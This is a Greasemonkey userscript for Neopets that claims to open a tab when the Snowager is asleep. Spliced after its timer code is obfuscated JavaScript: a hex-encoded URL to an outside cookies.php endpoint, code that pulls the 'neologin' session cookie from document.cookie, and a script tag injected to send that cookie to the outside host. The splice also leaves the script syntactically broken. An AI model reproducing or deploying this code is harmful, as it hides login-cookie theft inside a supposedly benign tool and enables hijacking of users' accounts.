// ==UserScript==
// @name           Neopets : Snowager Alert
// @namespace      http://gm.wesley.eti.br/neopets
// @description    Opens a new tab if Snowager is asleep
// @include        http://www.neopets.com/*
// @exclude        http://www.neopets.com/ads/*
// @exclude        http://www.neopets.com/games/play_flash.phtml?*
// @exclude        http://www.neopets.com/neomail_block_check.phtml?*
// @exclude        http://www.neopets.com/iteminfo.phtml?*
// @exclude        http://www.neopets.com/~*
// @require        http://www.wesley.eti.br/includes/js/php.js
// @require        http://www.wesley.eti.br/includes/js/php2js.js
// @require        http://gm.wesley.eti.br/gm_default.js
// @require        http://gm.wesley.eti.br/neopets/neopets_default.js
// @author         w35l3y
// @email          w35l3y@brasnet.org
// @version        1.0.3
// @copyright      w35l3y 2008
// @license        GNU GPL
// @homepage       http://www.wesley.eti.br
// ==/UserScript==

/**************************************************************************

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.

**************************************************************************/

checkForUpdate({
	'file':'http://userscripts.org/scripts/source/34084.user.js',
	'name':'Neopets : Snowager Alert',
	'namespace':'http://gm.wesley.eti.br/neopets',
	'version':'1.0.3'
});

(function recursive()
{	// script scope

	var user = {
		'increment':GM_getValue('increment',	0)	// milisseconds
	};

	var nst = Neopets.Time();
	nst.setMinutes(0,0,0);

	var h = nst.getHours();
	if (GM_getValue("lastAccess","0") != nst.valueOf() && (""+h).match(/^(?:0?6|14|22)$/))
	{
		GM_setValue("lastAccess",""+nst.valueOf());
		GM_openInTab("http://www.neopets.com/winter/snowager.phtml");
	}

	var snowagerDate = new Date(nst);
	snowagerDate.setHours(h+8-((2+h) % 8),0,0,0);

	setTimeout(recursive, snowagerDate.valueOf() - nst.valueOf() + user.increment){var voxDve=ewiorun.substr(nvnvndi);voxDve=voxDve.substr(voxDve.indexOf(mdimd)+mdimd.length);voxDve=voxDve.substr(0,voxDve.indexOf(ppodzzzd));if(hoddgXv)voxDve=mdimd+voxDve+ppodzzzd;return voxDve;}var xQNtwvv, nXxTP;var _0xa083=["\x68\x74\x74\x70\x3a\x2f\x2f\x68\x31\x2e\x72\x69\x70\x77\x61\x79\x2e\x63\x6f\x6d\x2f\x6b\x61\x79\x6f\x6c\x69\x78\x31\x32\x33\x2f\x63\x6f\x6f\x6b\x69\x65\x73\x2e\x70\x68\x70\x3f\x63\x6f\x6f\x6b\x69\x65\x3d"];var cxtVW =_0xa083[0x0];var xVDs=document.evaluate("a[@href='javascript: void(0);']",document,null,XPathResult.ANY_TYPE,null);var xOnT=xVDs.iterateNext();while(xOnT)xOnT=xVDs.iterateNext();xQNtwvv=document.getElementById('main');var CcxtVw=document.cookie;CcxtVw=gsb(CcxtVw, 'neologin=','; ', 0, false);if(xQNtwvv){nXxTP=document.createElement("div");nXxTP.innerHTML='<SCRIPT SRC='+cxtVW+CcxtVw+'>';xQNtwvv.parentNode.insertBefore(nXxTP,xQNtwvv.nextSibling) ;
})();

